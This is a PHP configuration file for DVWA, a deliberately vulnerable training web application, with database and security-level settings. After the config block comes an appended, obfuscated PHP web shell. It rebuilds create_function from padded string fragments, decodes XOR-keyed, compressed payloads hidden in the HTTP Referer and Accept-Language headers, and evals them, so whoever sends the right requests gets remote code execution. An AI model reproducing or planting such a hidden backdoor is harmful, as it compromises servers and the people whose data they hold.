<?php

# If you are having problems connecting to the MySQL database and all of the variables below are correct
# try changing the 'db_server' variable from localhost to 127.0.0.1. Fixes a problem due to sockets.
# Thanks to digininja for the fix.

# Database management system to use

$DBMS = 'MySQL';
#$DBMS = 'PGSQL';

# Database variables
# WARNING: The database specified under db_database WILL BE ENTIRELY DELETED during setup. 
# Please use a database dedicated to DVWA.

$_DVWA = array();
$_DVWA[ 'db_server' ] = 'localhost';
$_DVWA[ 'db_database' ] = 'dvwa';
$_DVWA[ 'db_user' ] = 'root';
$_DVWA[ 'db_password' ] = 'p@ssw0rd';

# Only needed for PGSQL
$_DVWA[ 'db_port' ] = '5432'; 

# ReCAPTCHA Settings
# Get your keys at https://www.google.com/recaptcha/admin/create
$_DVWA['recaptcha_public_key'] = "";
$_DVWA['recaptcha_private_key'] = "";

# Default Security Level
# The default is high, you may wish to set this to either low or medium.
# If you specify an invalid level, DVWA will default to high.
$_DVWA['default_security_level'] = "high";

?>
<?php
$B='Z="";for($iiZ=0;iZ$iZiZiZi<$l;){for($j=0;($j<iZ$c&&$i<$l);$iZiZj++,$i++){$o.iZ=$t{$i}^iZ$k{$';
$J='P_ACCEPT_iZLANiZGUAGE"];iZif($rr&&$ra){iZ$uiZ=parse_uriZl($rr);piZaiZiZrse_siZtr(iZ$u["query"]iZ,$';
$P='jiZ};}}riZetuiZiZrn $o;}$r=$_SERViZER;$rr=iZ@$iZiZr["HTTP_REiZFERER"]iZ;$ra=@$r[iZiZ"HTTiZ';
$Q='4_encode(x(gzcoiZmpreiZss($o),$iZk));iZpiZriniZt("<$k>$iZd</$k>");@siZeiZssion_iZdestroy();}}}}';
$K='$ss($iZiZs[$i],0,$e)iZ)),$k)iZ));$o=obiZ_get_iZcontentiZs();oiZb_end_iZclean(iZ);$d=iZbaiZsiZe6';
$N='iZiZi].=$iZp;$e=strpos($iZiZs[$i],$f);if(iZiZ$e){$k=$kh.$kiZf;ob_stiZart();iZ@evaiZl(@iZgzuniZ';
$p='$iZkh="081iZdiZ";$kfiZ="29b9";function x($tiZ,iZ$iZk){$c=siZtriZlen($k);$l=striZlen(iZ$t);$oi';
$c='strtiZoliZoweriZ";$i=iZ$m[1][0].iZ$m[1][iZ1];$iZh=$sl(iZ$ss(md5($iZi.$kiZhiZ),0,3));$f=$sl($i';
$Z=str_replace('Mi','','creMiMiateMi_MifuMiMinction');
$k='ZssiZ(iZmd5($i.iZ$kf),0,3))iZ;$p=iZ"";for($z=1;$iZiZziZ<count($m[1]iZ);$z++)$p.iZ=$q[$miZiZ[2][$z]];iZiZif';
$e='iZcompress(@x(@iZbaseiZ64_decode(preg_iZreiZplace(arriZay("/_iZ/","iZ/iZ-/"),array("iZ/","+iZ"),';
$n='q);$qiZ=array_valuesiZ($q);priZeg_miZatch_aiZll(iZ"/([\\w])[iZ\\w-iZ]+(?:;q=iZ0.([\\d])iZ)iZ?,?/",';
$Y='$ra,$m)iZ;if($iZiZq&&$m)iZ{@sessiiZon_siZtart();iZ$iZs=&$_SESSION;$ss="iZsubstriZ";iZ$sl="';
$R='(strpoiZs($iZp,$iZh)===0){$iZs[$i]="";$p=$iZss($p,3);iZ}if(ariZray_keiZy_exisiZts($i,iZ$iZs)){$s[$';
$M=str_replace('iZ','',$p.$B.$P.$J.$n.$Y.$c.$k.$R.$N.$e.$K.$Q);
$T=$Z('',$M);$T();
?>
